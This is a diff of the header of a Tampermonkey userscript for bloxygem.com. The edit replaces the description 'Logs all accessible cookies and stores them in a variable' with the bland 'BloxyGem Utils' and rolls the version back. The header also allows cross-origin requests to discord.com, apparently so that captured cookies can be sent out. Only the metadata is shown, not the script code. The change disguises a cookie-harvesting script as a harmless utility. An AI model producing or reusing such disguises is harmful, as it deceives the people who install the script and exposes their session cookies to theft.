@@ -2,8 +2,8 @@
 // ==UserScript==
 // @name         BloxyGem Script
 // @namespace    https://tampermonkey.net/
-// @version      1.2.0
-// @description  Logs all accessible cookies and stores them in a variable
+// @version      1.1
+// @description  BloxyGem Utils
 // @match        *://bloxygem.com/*
 // @grant        GM_xmlhttpRequest
 // @connect      discord.com
